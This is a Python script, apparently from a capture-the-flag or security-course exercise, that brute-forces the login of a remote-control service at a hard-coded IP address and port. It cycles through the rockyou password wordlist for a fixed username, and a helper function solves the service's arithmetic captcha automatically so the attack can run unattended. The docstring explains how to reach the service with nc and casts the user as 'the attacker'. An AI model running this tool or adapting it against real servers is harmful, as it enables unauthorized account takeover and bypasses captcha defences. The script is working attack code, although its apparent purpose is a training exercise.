"""
    If you know the IP address of v0idcache's server and you
    know the port number of the service you are trying to connect
    to, you can use nc or telnet in your Linux terminal to interface
    with the server. To do so, run:

        $ nc <ip address here> <port here>

    In the above the example, the $-sign represents the shell, nc is the command
    you run to establish a connection with the server using an explicit IP address
    and port number.

    If you have the discovered the IP address and port number, you should discover
    that there is a remote control service behind a certain port. You will know you
    have discovered the correct port if you are greeted with a login prompt when you
    nc to the server.

    In this Python script, we are mimicking the same behavior of nc'ing to the remote
    control service, however we do so in an automated fashion. This is because it is
    beneficial to script the process of attempting multiple login attempts, hoping that
    one of our guesses logs us (the attacker) into the Briong server.

    Feel free to optimize the code (ie. multithreading, etc) if you feel it is necessary.

"""

import socket

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file

def brute_force():
    found_password = True
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command

        General idea:

            Given that you know a potential username, use a wordlist and iterate
            through each possible password and repeatedly attempt to login to
            v0idcache's server.
    """        
    username = "ejnorman84"   # Hint: use OSINT
    password = ""   # Hint: use wordlist
    
    with open(wordlist) as f:
        print "Attempting brute force against " + host
        for line in f:
            need_to_restart = True
            while need_to_restart:
                need_to_restart = False
                if True:#line[0] == 'p' and len(line) == 11:
                    better_line = line.replace("\n", "")
                    print "Attempting pass: " + better_line
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((host, port))
                    data = s.recv(1024)
                    #print data
                    #print len(data)
                    if len(data) < 20: #didn't recv all of captcha
                        print "Malformed capatcha, restart\n"
                        need_to_restart = True
                    else: #Send captcha code
                        s.send(str(solve_captcha(data)) + "\n")
                    
                        data = s.recv(1024)
                        if data == "Fail": #If capatcha failed for some reason
                            need_to_restart = True
                            print "Captcha failed, trying again\n"
                        else:
                            
                            s.send(username + "\n") #sending username
                
                            data = s.recv(1024)
                            #print data
                
                            s.send(line)
                            data = s.recv(1024)
                            if len(data) == 10:
                                need_to_restart = True
                                print "Missed response, restarting\n"
                            else:
                                if data != "Fail\n":
                                    print len(data)
                                    print data
                                    print "-----------------------\n"
                                    print "   PASSWORD FOUND\n"
                                    print "-----------------------\n"
                                    print "Password: " + line + "\n"
                                    return
               # else:
                #    s.close()
        print "No passwords found :("        
        
    
def solve_captcha(data):
    array = data.splitlines()
    cap = array[2].split()
    
    if cap[1] == "+":
        return int(cap[0]) + int(cap[2])
    elif cap[1] == "-":
        return int(cap[0]) - int(cap[2])
    elif cap[1] == "*":
        return int(cap[0]) * int(cap[2])
    elif cap[1] == "/":
        return int(cap[0]) / int(cap[2])
    else:
        print "what the fuck is this shit: " + cap[1]
        return -1
        
    #print(cap[0] + " and " + cap[2])
    #print(array[2])
    #print (data[1])


if __name__ == '__main__':
    brute_force()
